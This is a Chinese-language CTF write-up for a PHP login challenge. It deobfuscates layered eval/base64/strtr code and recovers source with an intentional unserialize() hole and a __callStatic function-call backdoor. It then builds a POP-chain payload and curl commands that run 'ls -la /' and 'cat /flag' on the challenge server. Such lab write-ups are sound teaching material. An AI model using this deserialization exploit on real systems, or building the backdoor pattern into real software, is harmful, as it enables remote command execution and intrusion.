---

title: PHP反序列化-login-wp
date: 2026-07-21
categories: ["CTF-Writeups"]
permalink: /ctf-writeups/php-login-wp
---


# PHP反序列化-login

## 📖 题目描述

一个 PHP 登录页面，需要找到隐藏的 flag。页面表面是一个登录表单，但源代码经过了多层混淆编码，实际是一道 PHP 反序列化（POP 链）漏洞利用题。

--
## 🔍 考察知识点

- PHP 代码混淆与逆向（多层 base64 + strtr 编码）
- robots.txt 信息泄露（`Disallow: qsnctf.php`）
- www.zip 源码泄露
- PHP 反序列化漏洞（`unserialize()`）
- POP 链（Property-Oriented Programming）构造
- PHP 魔术方法：`__destruct()`、`__toString()`、`__callStatic()`

---
## 🛠️ 使用的工具

| 工具 | 在这个题里用它做了什么 |
|------|----------------------|
| dirsearch | 目录扫描，发现 www.zip 源码泄露 |
| PHP CLI | 本地运行解码脚本，逐层还原混淆的源代码 |
| curl | 构造并发送反序列化 POST payload |

---

## 🧭 解题步骤

### 步骤 1：信息收集

> 💡 **这一步在做什么？** 先用目录扫描工具发现泄露的源码文件

使用 dirsearch 扫描目标站点：

```
python dirsearch.py -u http://challenge.qsnctf.com:41934/ -e php,txt,bak,zip,sql
```

发现两个重要文件：
- `www.zip` — 网站源码压缩包
- `robots.txt` — 内容为 `Disallow: qsnctf.php`

下载 `www.zip` 解压后得到：
- `qsnctf (2).php` — 网站首页源码（经过混淆）
- `qsnctf (3).txt` — robots.txt 内容

---

### 步骤 2：代码逆向 — 第一层解码

> 💡 **这一步在做什么？** 分析混淆的 PHP 代码，逐层还原出原始逻辑

首页源码的核心混淆部分：

```php
$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");
$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};
$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};
$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};
$OO0000=$O00OO0{7}.$O00OO0{13};
$O00O0O.=$O00OO0{22}.$O00OO0{36}...;
eval($O00O0O("JE8wTzAwMD0iS1hw..."));  // 超长 base64
```

**解码过程：**

1. `urldecode()` 解码后得到字符串：`n1zb/ma5\vt0i28-pxuqy*6lrkdg9_ehcswo4+f37j`
2. 通过字符位置拼接，得到关键函数名：
   - `$O00O0O` = `base64_decode`
   - `$O0OO00` = `strtr`
   - `$OO0O00` = `substr`
   - `$OO0000` = `52`
3. `eval(base64_decode(超长base64字符串))` 执行第一层解码，得到第二层代码

---

### 步骤 3：代码逆向 — 第二层解码

> 💡 **这一步在做什么？** 第二层使用了「字符替换表 + base64」的组合混淆

第二层代码结构：

```php
$O0O000 = "KXpJtRrgqUOHcFewyoPSWnCb...";   // 超长字符串
eval('?>' . $O00O0O(                          // base64_decode
    $O0OO00(                                   // strtr
        $OO0O00($O0O000, $OO0000*2),          // substr(大字符串, 104) = 被替换串
        $OO0O00($O0O000, $OO0000, $OO0000),   // substr(大字符串, 52, 52) = from 映射
        $OO0O00($O0O000, 0, $OO0000)          // substr(大字符串, 0, 52) = to 映射
    )
));
```

等价于：

```php
$from = substr($大字符串, 52, 52);   // 字符映射表 "from"
$to   = substr($大字符串, 0, 52);    // 字符映射表 "to"
$str  = substr($大字符串, 104);      // 被替换的真实代码
$result = base64_decode(strtr($str, $from, $to));
eval('?>' . $result);
```

解码后得到**完整的网站源码**：

```php
<?php
error_reporting(0);

class shi {
    public $next;
    public $pass;
    public function __toString(){
        $this->next::PLZ($this->pass);
    }
}

class wo {
    public $sex;
    public $age;
    public $intention;
    public function __destruct(){
        echo "Hi Try serialize Me!";
        $this->inspect();
    }
    function inspect(){
        if($this->sex=='boy' && $this->age=='eighteen') {
            echo $this->intention;
        }
        echo "🙅18岁🈲";
    }
}

class Demo {
    public $a;
    static function __callStatic($action, $do) {
        global $b;
        $b($do[0]);
    }
}

$b = $_POST['password'];
$a = $_POST['username'];
@unserialize($a);
```

---

### 步骤 4：分析 POP 链

> 💡 **这一步在做什么？** 分析三个类之间的调用关系，构造从反序列化入口到命令执行的完整链

**POP 链调用流程：**

```
① unserialize($_POST['username'])
       ↓  创建 wo 对象，脚本结束时自动触发 __destruct()
② wo::__destruct()
       ↓  调用 $this->inspect()
③ wo::inspect()
       ↓  检查 $sex=='boy' && $age=='eighteen' ✓
       ↓  echo $this->intention  — 其中 intention 是一个 shi 对象
④ shi::__toString()
       ↓  $this->next::PLZ($this->pass)
       ↓  $this->next = 'Demo'，调用不存在的静态方法 Demo::PLZ()
⑤ Demo::__callStatic("PLZ", [$this->pass])
       ↓  global $b → $b = $_POST['password'] = 'system'
       ↓  $b($do[0]) → system("cat /flag")
⑥ 命令执行 🎯
```

**关键魔术方法总结：**

| 类 | 魔术方法 | 触发条件 | 在链中的作用 |
|----|----------|----------|-------------|
| `wo` | `__destruct()` | 对象销毁 | 链的入口，调用 `inspect()` |
| `wo` | `inspect()` | 由上一步触发 | 验证属性后 `echo` 对象，触发 `__toString()` |
| `shi` | `__toString()` | 对象被当作字符串 | 调用任意类的任意静态方法 |
| `Demo` | `__callStatic()` | 调用不存在的静态方法 | `global $b` 拿到 password 参数，执行命令 |

---

### 步骤 5：构造 Payload

> 💡 **这一步在做什么？** 用 PHP 脚本生成序列化 payload

```php
<?php
class shi {
    public $next;
    public $pass;
}
class wo {
    public $sex;
    public $age;
    public $intention;
}

$shi = new shi();
$shi->next = 'Demo';
$shi->pass = 'cat /flag';    // 要执行的系统命令

$wo = new wo();
$wo->sex = 'boy';
$wo->age = 'eighteen';
$wo->intention = $shi;

echo serialize($wo);
?>
```

生成的 Payload：

```
O:2:"wo":3:{s:3:"sex";s:3:"boy";s:3:"age";s:8:"eighteen";s:9:"intention";O:3:"shi":2:{s:4:"next";s:4:"Demo";s:4:"pass";s:9:"cat /flag";}}
```

---

### 步骤 6：发送 Exploit

> 💡 **这一步在做什么？** 用 POST 请求发送序列化对象（username）和要执行的函数名（password）

先用 `ls -la /` 探测服务器文件：

```bash
curl -X POST "http://challenge.qsnctf.com:41934/" \
  --data-urlencode "username=O:2:\"wo\":3:{s:3:\"sex\";s:3:\"boy\";s:3:\"age\";s:8:\"eighteen\";s:9:\"intention\";O:3:\"shi\":2:{s:4:\"next\";s:4:\"Demo\";s:4:\"pass\";s:8:\"ls -la /\";}}" \
  --data-urlencode "password=system"
```

输出中可以看到根目录存在 `/flag` 文件。

然后读取 flag：

```bash
curl -X POST "http://challenge.qsnctf.com:41934/" \
  --data-urlencode "username=O:2:\"wo\":3:{s:3:\"sex\";s:3:\"boy\";s:3:\"age\";s:8:\"eighteen\";s:9:\"intention\";O:3:\"shi\":2:{s:4:\"next\";s:4:\"Demo\";s:4:\"pass\";s:9:\"cat /flag\";}}" \
  --data-urlencode "password=system"
```

响应中 `Hi Try serialize Me!` 之后即为命令执行结果。

---

## 💡 解题心得

- **源码混淆逆向**：遇到混淆代码不要慌，逐层手动解码是关键。本题用两层编码：第一层 base64 + 字符串拼接构造函数名，第二层 strtr 字符替换 + base64
- **POP 链思维**：PHP 反序列化题的核心是**找到从入口魔术方法到危险函数的调用路径**。本题路径为 `__destruct` → `__toString` → `__callStatic` → `$b($do[0])`
- **`__callStatic` 后门**：`__callStatic` 配合 `global $b` 是一个经典"后门"模式——攻击者可以同时控制函数名（`password=system`）和参数（`pass=cat /flag`）
- **信息收集**：CTF 中要关注 `robots.txt`、`www.zip`、`.git` 等源码泄露点，这些往往是获取源码的关键入口

